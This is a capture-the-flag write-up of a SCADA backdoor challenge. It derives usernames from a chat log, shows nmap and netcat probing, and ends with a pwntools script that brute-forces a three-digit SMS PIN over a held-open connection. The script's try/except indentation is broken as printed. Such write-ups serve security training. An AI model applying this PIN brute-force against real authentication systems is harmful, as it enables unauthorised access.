# 2.3_scada_aksess

The previous flag gave us a hint regarding a _backdoor_ (bakdør).

> Du har fått tilgang til gisseltakerenes bakdør inn i styringssystemet.
> Klarer du å styre systemet selv?

And from the chat log `07 DES 2020`, we see that they talk about a backdoor and usernames.

```
[18:27] B4tCracK: for future reference; your username to the backdoor is the first three letters of your first name followed by the
[18:27] B4tCracK: length of your username here and ending with your last name. The capital letters of your name stays capital.
[18:27] B4tCracK: I will NOT repeat this, and do NOT, I repeat; DO NOT write it down!
```
---

## Usernames
We have all the information we need to find the usernames for each person and generate the following list.

| Username           | Full name      | Backdoor username |
| ------------------ | -------------- | ----------------- |
| hungry_hippo_123   | Frank Shorius  | Fra16Shorius      |
| eireen89           | Eireen Farnaby | Eir8Farnaby       |
| RADAR              | Joe Farnaby    | Joe5Farnaby       |
| B4tCracK           | Dillian Cruise | Dil8Cruise        |

----

## Enumeration

We now need to find the actual backdoor. We already know there is a web application (`scada_frontend`) running on the `scada` host, and decide to scan it with nmap:

```sh
Nmap scan report for 074767c25656ad47d4c9d6b079a1ff25_scada.1.w7z18rmflsmd7aj2hb5iez19u.074767c25656ad47d4c9d6b079a1ff25_backend (10.0.74.75)
Host is up (0.0038s latency).
Scanned at 2020-12-21 11:48:24 CET for 1615s
Not shown: 65532 closed ports
PORT     STATE SERVICE        VERSION
80/tcp   open  http           nginx 1.14.2
|_http-title: scada_frontend
1338/tcp open  wmc-log-svc?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Username: That username is not recognized
|     were unable to log you in..
|   NULL: 
|_    Username:
1339/tcp open  kjtsiteserver?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Sec-Websocket-Version: 13
|     X-Content-Type-Options: nosniff
|     Date: Mon, 21 Dec 2020 10:59:29 GMT
|     Content-Length: 12
|     Request
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Sec-Websocket-Version: 13
|     X-Content-Type-Options: nosniff
|     Date: Mon, 21 Dec 2020 10:59:04 GMT
|     Content-Length: 12
|_    Request
```

We see two additional ports, `1338` and `1339`, and see that port `1338` requests a username.

---

## Backdoor
Manually connecting to port `1338` promps for a username, and if we input something random we see that the username is not recognized. However, if we input one of the usernames from our list, we see that Frank's user has been revoked answer. We therefore assume that this port is the backdoor that we need to use.

```sh
login@corax:~$ nc scada 1338
Username: test
That username is not recognized
We were unable to log you in..
```
```sh
login@corax:~$ nc scada 1338
Username: Fra16Shorius
User access revoked..
We were unable to log you in..
```

--- 

## Multi-factor authentication

Connecting to the backdor using one of the other usernames we are prompted for a PIN that has been sent to the users' phone via. SMS.
```sh
login@corax:~$ nc scada 1338
Username: Joe5Farnaby
We have now sent a login PIN to you via SMS
Enter PIN: 111
..the provided PIN was not correct.
```
Attempting to add more than 3 digits result with the same error message appended multiple times, depending on how many extra digits we add, indicating that the connection is held open. 
```sh
login@corax:~$ nc scada 1338
Username: Joe5Farnaby
We have now sent a login PIN to you via SMS
Enter PIN: 1111
..the provided PIN was not correct.
..the provided PIN was not correct.
```
```sh
login@corax:~$ nc scada 1338
Username: Joe5Farnaby
We have now sent a login PIN to you via SMS
Enter PIN: 11111
..the provided PIN was not correct.
..the provided PIN was not correct.
..the provided PIN was not correct.
```
---

## Bruteforce
We write a quick and dirty [Python script](./access_backdoor.py) that runs a loop that tries to login with the username `Joe5Farnaby`. It is possible to bruteforce this PIN as the connection after the first attempt is still open, and continue allowing the client to send data. Running this script gives us a welcome back message and the flag is included.

```python
from pwn import *
while True:
    io = remote("scada", 1338)
    io.recvuntil(':')
    io.send("Joe5Farnaby")
    io.recvuntil(':')
    try:
        for i in range(999):
            pin = str(i).zfill(3)
            io.sendline(pin)
            data = io.recv()
            if b"Welcome back" in data:
                # PIN worked, we are in!
                io.recvline()
                io.recvline()
                io.recvline()
                io.recvline()
                exit(0)
            elif b"too many digits" in data:
                # You have entered too many digits for the MFA check
                # Reset connection
                break
            # else: the provided PIN was not correct
        except Exception as e:
            print("Exception in client:", e)
    io.close()
```



---

```sh
login@corax:~$ scoreboard 6b7e34a771b84d0863ce3c7dbd887463
Kategori: 2. Oppdrag
Oppgave:  2.3_scada_aksess
Svar:     6b7e34a771b84d0863ce3c7dbd887463

Godt jobbet! Nå må du bare hjelpe gisselet med å komme seg ut av bygningen!
```
